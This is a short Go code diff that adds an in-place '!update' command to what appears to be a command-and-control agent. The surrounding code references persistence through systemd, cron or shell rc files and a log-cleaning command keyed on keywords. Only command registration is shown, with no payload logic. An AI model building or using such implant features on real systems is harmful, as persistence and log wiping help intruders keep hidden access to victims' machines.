@@ -34,6 +34,19 @@ func platformCommands(cmd *cobra.Command) {
 	}
 	persistCmd.Flags().StringP("method", "m", "auto", "Persistence mechanism: auto|systemd|cron|shellrc")
 	cmd.AddCommand(persistCmd)
+
+	// !update --file <path>
+	// In-place upgrade from a build pushed via the file manager. Keeps the
+	// persistence copy (if any) in sync and restarts into the new binary.
+	updateCmd := &cobra.Command{
+		Use:     def.C2CmdUpdate,
+		Short:   "Upgrade this agent in place from an uploaded build",
+		Example: "!update --file /tmp/agent_linux_amd64_2026-9-20_1-4-1",
+		GroupID: "linux",
+		Run:     runUpdate,
+	}
+	updateCmd.Flags().StringP("file", "f", "", "Path to the uploaded new agent binary")
+	cmd.AddCommand(updateCmd)
 }
 
 // runCleanLogLinux implements: !clean_log --keyword <keyword>
